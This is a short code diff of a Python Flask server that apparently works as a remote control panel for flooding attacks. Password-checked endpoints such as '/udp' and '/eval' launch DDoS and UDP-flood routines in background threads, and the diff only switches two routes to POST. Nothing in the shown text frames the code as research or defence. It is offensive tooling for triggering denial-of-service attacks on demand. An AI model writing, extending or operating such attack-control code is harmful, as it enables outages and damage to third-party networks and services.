@@ -37,7 +37,7 @@ def attack():
 	ddos.start()
 	return "successful"
 
-@app.route('/udp')
+@app.route('/udp',methods=["POST"])
 def udp():
 	info = json.loads(request.get_data())
 	if info["pass"] != os.getenv("password"):
@@ -64,7 +64,7 @@ def tcp():
 	udpflood.choice = "n"
 	th = threading.Thread(target=udpflood.mainudp).start()
 
-@app.route('/eval')
+@app.route('/eval',methods=["POST"])
 def eval():
 	info = json.loads(request.get_data())
 	if info["pass"] != os.getenv("password"):
